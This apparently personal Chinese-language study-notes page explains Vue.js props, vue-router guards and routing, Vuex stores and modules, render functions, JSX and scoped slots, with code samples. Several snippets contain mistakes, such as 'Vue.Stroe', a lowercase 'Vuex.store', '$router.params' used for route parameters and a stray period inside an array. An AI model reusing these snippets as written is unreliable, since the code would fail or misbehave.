<h2 id="指定prop的更多细节"><a href="#指定prop的更多细节" class="headerlink" title="指定prop的更多细节"></a>指定prop的更多细节</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">  props: &#123;</span><br><span class="line">    title: &#123;</span><br><span class="line"><span class="javascript">      type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="javascript">      required: <span class="literal">true</span>,</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="v-bind的prop修饰符"><a href="#v-bind的prop修饰符" class="headerlink" title="v-bind的prop修饰符"></a>v-bind的prop修饰符</h2><p>可以直接设置DOM节点的属性。而不是HTML属性。适合在处理输入框元素的属性（如value）中使用。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">:value.prop</span>=<span class="string">"value"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><p>可实现数据与视图的双向绑定<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"value"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>默认使用的value prop和input事件。</p>
<h2 id="路由跳转"><a href="#路由跳转" class="headerlink" title="路由跳转"></a>路由跳转</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$router.push(&#123;<span class="attr">name</span>: <span class="string">'home'</span>&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="路由类型"><a href="#路由类型" class="headerlink" title="路由类型"></a>路由类型</h2><p>我们可以有不同类型的路由</p>
<ol>
<li>公开路由（都可以）</li>
<li>私有路由（仅登录用户）</li>
<li>访客路由（仅未登录用户）<h2 id="路由元属性"><a href="#路由元属性" class="headerlink" title="路由元属性"></a>路由元属性</h2>路由的类型可以添加在路由的meta属性中<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">path</span>: <span class="string">'/tickets'</span>, ... , <span class="attr">meta</span>: &#123; <span class="attr">private</span>: <span class="literal">true</span> &#125; &#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="路由器导航守卫"><a href="#路由器导航守卫" class="headerlink" title="路由器导航守卫"></a>路由器导航守卫</h2><p>当路由变化时会调用函数钩子，它们可以改变路由器的行为。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (to.meta.private &amp;&amp; !state.user) &#123;</span><br><span class="line">    next(&#123;</span><br><span class="line">      name: <span class="string">'login'</span>,</span><br><span class="line">      params: &#123;</span><br><span class="line">        wantedRoute: to.fullPath,</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  next();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>在login组件中使用wantedRoute参数重定向<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$router.replace(<span class="keyword">this</span>.$router.params.wantedRoute || &#123; <span class="attr">name</span>: <span class="string">'home'</span> &#125;)</span><br></pre></td></tr></table></figure></p>
<p>router.replace和push的区别是将当前条目替换为新路由，而不是添加条目。</p>
<h2 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/tickets'</span>,</span><br><span class="line">    component: TicketsLayout,</span><br><span class="line">    children: [</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">''</span>,</span><br><span class="line">        name: <span class="string">'tickets'</span>,</span><br><span class="line">        component: Tickets</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        path: <span class="string">'new'</span>,</span><br><span class="line">        name: <span class="string">'new-ticket'</span>,</span><br><span class="line">        component: newTicket</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>对于嵌套路由，导航守卫中的条件需要修改：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (to.matched.some(<span class="function"><span class="params">r</span> =&gt;</span> r.meta.private) &amp;&amp; !state.user) &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (to.matched.some(<span class="function"><span class="params">r</span> =&gt;</span> r.meta.guest) &amp;&amp; state.user) &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="绑定属性"><a href="#绑定属性" class="headerlink" title="绑定属性"></a>绑定属性</h2><p>$attrs特殊属性，可以获取组件上所有非prop属性作为对象。<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FormTextArea</span> <span class="attr">rows</span>=<span class="string">"4"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span></span></span><br><span class="line"><span class="tag">  <span class="attr">...</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-bind</span>=<span class="string">"$attrs"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><p>/tickets/:id -&gt; /tickets/abc -&gt; { id: ‘abc’ }<br>/tickets/:id/components/:comId -&gt; /tickets/abc/components/42 -&gt; { id: ‘abc’, comId: ‘42’ }</p>
<p>router.params中可以获取动态参数</p>
<h2 id="404页面"><a href="#404页面" class="headerlink" title="404页面"></a>404页面</h2><p>放置路由的最后<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  ...</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'*'</span>,</span><br><span class="line">    component: NotFound</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<h2 id="滚动行为"><a href="#滚动行为" class="headerlink" title="滚动行为"></a>滚动行为</h2><p>history模式允许我们在路由改变时管理页面滚动。<br>路由改变时滚动到页面的顶部：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  mode: <span class="string">'history'</span>,</span><br><span class="line">  scrollBehavior(to, <span class="keyword">from</span>, savedPosition) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>每次滚动到<code>&lt;h1&gt;</code>元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123; <span class="attr">selector</span>: <span class="string">'h1'</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>更完善的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (savedPosition) &#123;</span><br><span class="line">  <span class="keyword">return</span> savedPosition</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (to.hash) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">selector</span>: to.hash &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="06"><a href="#06" class="headerlink" title="06"></a>06</h1><h2 id="使用Vuex进行状态管理"><a href="#使用Vuex进行状态管理" class="headerlink" title="使用Vuex进行状态管理"></a>使用Vuex进行状态管理</h2><p>Vuex可以让我们使用一个集中式store来管理应用的全局状态。</p>
<ol>
<li>为什么使用集中式的状态管理<br>随着组件之间的联系越来越复杂，太多的组件需要同步数据，应用的状态变得难以控制。Vuex从Flux获得灵感。Flux由一系列指导原则构成，阐明了如何使用集中式store来实现组件之间的单向数据流，可以很容易地推算出应用的逻辑和流程，从而极大地提升应用的可维护性。</li>
</ol>
<h2 id="Vuex-store"><a href="#Vuex-store" class="headerlink" title="Vuex store"></a>Vuex store</h2><p>Vuex的核心元素是store，它是一个特殊的对象，允许你将应用中的数据集中在一个设计良好的模型中。</p>
<p>store包含如下信息：<br>state,存储应用状态的响应式数据对象<br>getter,等价于store的计算属性<br>mutation,用来改变应用状态的函数<br>action,通常用来调用异步API的函数，然后使用mutation改变数据。</p>
<p>下面我们来创建一个store来熟悉这些概念。</p>
<p>安装Vuex插件<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(Vuex);</span><br></pre></td></tr></table></figure></p>
<p>使用Vuex.Store构造函数创建store<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.store(&#123;</span><br><span class="line">  <span class="comment">// TODO 选项</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>在应用中注入store<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  ...App,</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>现在可以在所有组件中使用$store这个特殊的属性来访问store了。</p>
<h2 id="state是唯一数据源"><a href="#state是唯一数据源" class="headerlink" title="state是唯一数据源"></a>state是唯一数据源</h2><p>Vuex的第一个原则就是，state是共享数据的唯一数据源。state是store的主要组成部分，它展示了应用中组件的所有共享数据。<br>我们在state中添加一个user属性<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vue.Stroe(&#123;</span><br><span class="line">  state() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      user: <span class="literal">null</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>state是只读的，您不应该直接修改它。改变状态的唯一途经就是通过mutation，这样可以让共享状态易于预测。</p>
<p>读取状态<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">  computed: &#123;</span><br><span class="line">    user () &#123;</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="keyword">this</span>.$store.state.user</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="使用mutation修改状态"><a href="#使用mutation修改状态" class="headerlink" title="使用mutation修改状态"></a>使用mutation修改状态</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state () &#123; <span class="comment">/* ... */</span> &#125;,</span><br><span class="line"></span><br><span class="line">  mutations: &#123;</span><br><span class="line">    user: <span class="function">(<span class="params">state, user</span>) =&gt;</span> &#123;</span><br><span class="line">      state.user = user;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>使用commit方法触发mutation处理函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">store.commit(<span class="string">'user'</span>, userData);</span><br></pre></td></tr></table></figure></p>
<h2 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h2><p>mutation的同步特性是出于调试的目的，可以借助开发者工具生成快照方便地调试应用。为了避免在mutation中使用异步调用，你可以在开发环境开启严格模式：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  strict: process.env.NODE_ENV !== <span class="string">'production'</span>,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>调试利器——时间旅行<br>使用Vuex你可以结合devtools追踪状态的每一次修改，这将极大地提升你的调试效率。</p>
<h2 id="使用getter计算和返回数据"><a href="#使用getter计算和返回数据" class="headerlink" title="使用getter计算和返回数据"></a>使用getter计算和返回数据</h2><p>可以将getter看成store的计算属性<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  getters: &#123;</span><br><span class="line">    user: <span class="function"><span class="params">state</span> =&gt;</span> state.user,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>可以使用getter代替之前直接获取状态的方法：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">user () &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.$store.getters.user</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<p>我们使用getter,它可以让你在修改获取数据的方式时无需修改使用此数据的组件。</p>
<h2 id="使用action操作store"><a href="#使用action操作store" class="headerlink" title="使用action操作store"></a>使用action操作store</h2><p>action不仅可以提交mutation，还能做异步操作。<br>action的处理函数接受两个参数：</p>
<ol>
<li>context,它提供commit、dispatch、state以及链接到store的getters工具函数</li>
<li>payload,它是dispatch分发时带上的参数<br>创建action<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  actions: &#123;</span><br><span class="line">    logout (&#123; commit &#125;) &#123;</span><br><span class="line">      commit(<span class="string">'user'</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>分发action<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">store.dispatch(&apos;action-type&apos;, payload);</span><br></pre></td></tr></table></figure></p>
<p>你应该总是使用action而不是mutation。因为修改action中的代码会比修改组件中的代码更好，要把action看成应用逻辑的抽象。</p>
<h2 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a>辅助函数</h2><p>Vuex还提供了辅助函数mapGetters和mapActions，它帮我们生成了相应的getter计算属性和action方法。辅助函数的参数可以是以下两者之一：</p>
<ol>
<li>类型的数组，其中的每一个元素对应于组件中的同名数据</li>
<li>对象，其中的键是组件中数据的别名，值则是类型<br>例如：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mapGetters([<span class="string">'a'</span>, <span class="string">'b'</span>])</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>等价于<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  a () &#123; <span class="keyword">return</span> <span class="keyword">this</span>.$store.getters.a &#125;,</span><br><span class="line">  b () &#123; <span class="keyword">return</span> <span class="keyword">this</span>.$store.getters.b &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mapGetters(&#123; <span class="attr">x</span>: <span class="string">'a'</span>, <span class="attr">y</span>: <span class="string">'b'</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>等价于<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  x () &#123; <span class="keyword">return</span> <span class="keyword">this</span>.$store.getters.a &#125;,</span><br><span class="line">  y () &#123; <span class="keyword">return</span> <span class="keyword">this</span>.$store.getters.b &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>让我们在组件中使用它吧<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapGetters, mapActions &#125; <span class="keyword">from</span> <span class="string">'vuex'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  computed: mapGetters([</span><br><span class="line">    <span class="string">'user'</span>,</span><br><span class="line">  ]),</span><br><span class="line">  methods: mapActions(&#123;</span><br><span class="line">    logout: <span class="string">'logout'</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="同步store和路由"><a href="#同步store和路由" class="headerlink" title="同步store和路由"></a>同步store和路由</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; sync &#125; <span class="keyword">from</span> <span class="string">'vuex-router-sync'</span>;</span><br><span class="line"></span><br><span class="line">sync(store, router);</span><br></pre></td></tr></table></figure>
<p>你可以使用state.router对象获取当前路由信息，还可以使用时间旅行调试它。</p>
<h2 id="Vuex模块"><a href="#Vuex模块" class="headerlink" title="Vuex模块"></a>Vuex模块</h2><p>我们可以将状态划分为不同的模块，以便更好地管理。模块和store很像，store和其中的每一个模块都可以包含任意数量的模块，如何组织出最有利于项目的store模块结构需要你来斟酌。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// maps.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  namespaced: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">  state () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      center: &#123;&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> maps <span class="keyword">from</span> <span class="string">'./maps'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  modules: &#123;</span><br><span class="line">    maps,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>你可以通过store.state.maps使用这个模块。</p>
<h2 id="带命名空间的模块"><a href="#带命名空间的模块" class="headerlink" title="带命名空间的模块"></a>带命名空间的模块</h2><p>上面模块中的namespaced选项告诉Vuex在该模块的所有getter、mutation和action前添加maps命名空间。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mapGetters(&#123;</span><br><span class="line">  center: <span class="string">'maps/center'</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>也可以指定命名空间<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">...mapGetters(<span class="string">'maps'</span>, [</span><br><span class="line">  <span class="string">'center'</span>.</span><br><span class="line">  <span class="string">'zoom'</span>,</span><br><span class="line">]),</span><br></pre></td></tr></table></figure></p>
<p>还可以使用createNamespacedHelpers生成基于某个命名空间的辅助函数：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createNamespacedHelpers &#125; <span class="keyword">from</span> <span class="string">'vuex'</span>;</span><br><span class="line"><span class="keyword">const</span> &#123; mapGetters &#125; = createNamespacedHelpers(<span class="string">'maps'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  computed: mapGetters([</span><br><span class="line">    <span class="string">'center'</span>,</span><br><span class="line">  ])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="访问全局元素"><a href="#访问全局元素" class="headerlink" title="访问全局元素"></a>访问全局元素</h2><p>你可以在命名空间模块的getter中访问到根getter(即所有的getter)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">myAction (&#123; dispatch, commit, getters, rootGetters &#125;) &#123;</span><br><span class="line">  getters.a <span class="comment">// store.getters['map/a']</span></span><br><span class="line">  rootGetters.a <span class="comment">// store.getters['a']</span></span><br><span class="line">  commit(<span class="string">'someMutation'</span>) <span class="comment">// 'maps/someMutation'</span></span><br><span class="line">  commit(<span class="string">'someMutation'</span>, <span class="literal">null</span>, &#123; <span class="attr">root</span>: <span class="literal">true</span> &#125;) <span class="comment">// 'someMutation'</span></span><br><span class="line">  dispatch(<span class="string">'someAction'</span>) <span class="comment">// 'maps/someAction'</span></span><br><span class="line">  dispatch(<span class="string">'someAction'</span>, <span class="literal">null</span>, &#123; <span class="attr">root</span>: <span class="literal">true</span> &#125;) <span class="comment">// 'someAction'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用JavaScript渲染函数编写视图"><a href="#使用JavaScript渲染函数编写视图" class="headerlink" title="使用JavaScript渲染函数编写视图"></a>使用JavaScript渲染函数编写视图</h2><p>大多数情况下使用模板就够了，但你也可能遇到需要使用JavaScript完整编程能力来编写组件界面的情况。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'my-title'</span>, &#123;</span><br><span class="line">  props: [<span class="string">'level'</span>],</span><br><span class="line">  render (h) &#123;</span><br><span class="line">    <span class="keyword">return</span> h(</span><br><span class="line">      <span class="string">`h<span class="subst">$&#123;<span class="keyword">this</span>.level&#125;</span>`</span>,</span><br><span class="line">      <span class="keyword">this</span>.$slots.default,</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="JSX-1"><a href="#JSX-1" class="headerlink" title="JSX"></a>JSX</h2><p>JSX语言是为了在render函数中编写更类似于HTML形式的代码。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  props: [<span class="string">'message'</span>],</span><br><span class="line">  render (h) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      &#123; this.message &#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在JSX中，首字母大写很重要。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> LocationInfo <span class="keyword">from</span> <span class="string">'./LocationInfo.vue'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  render (h) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">LocationInfo</span> /&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="更完善的vuex结合方式"><a href="#更完善的vuex结合方式" class="headerlink" title="更完善的vuex结合方式"></a>更完善的vuex结合方式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; createNamespacedHelpers &#125; <span class="keyword">from</span> <span class="string">'vuex'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> &#123;</span></span><br><span class="line">    mapGetters: postsGetters,</span><br><span class="line">    mapActions: postsActions</span><br><span class="line"><span class="javascript">  &#125; = createNamespacedHelpers(<span class="string">'posts'</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">    computed: &#123;</span><br><span class="line">      ...postsGetters([</span><br><span class="line"><span class="javascript">        <span class="string">'draft'</span>,</span></span><br><span class="line">      ]),</span><br><span class="line">      title: &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">get</span>() &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="keyword">this</span>.draft.title</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="keyword">set</span>(value) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">this</span>.updateDraft(&#123;</span></span><br><span class="line">            ...this.draft,</span><br><span class="line">            title: value,</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      ...postsActions([</span><br><span class="line"><span class="javascript">        <span class="string">'updateDraft'</span></span></span><br><span class="line">      ])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="分发无命名空间的action"><a href="#分发无命名空间的action" class="headerlink" title="分发无命名空间的action"></a>分发无命名空间的action</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">setBounds (&#123; dispatch &#125;, value) &#123;</span><br><span class="line">  dispatch(<span class="string">'posts/fetchPosts'</span>, &#123;</span><br><span class="line">    mapBounds: value,</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    root: <span class="literal">true</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="作用域插槽"><a href="#作用域插槽" class="headerlink" title="作用域插槽"></a>作用域插槽</h2><p>我们可以通过插槽将属性传递给外部视图<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"search"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">:result</span>=<span class="string">"results"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">  computed: &#123;</span><br><span class="line">    results () &#123;</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="comment">/* ... */</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">slot-scope</span>=<span class="string">"props"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; props.result.length &#125;&#125; results<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>还可以结合循环使用<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">slot</span> <span class="attr">v-for</span>=<span class="string">"r of results"</span> <span class="attr">:result</span>=<span class="string">"r"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">slot-scope</span>=<span class="string">"props"</span> <span class="attr">class</span>=<span class="string">"result"</span>&gt;</span>&#123;&#123;props.result.label&#125;&#125;<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>
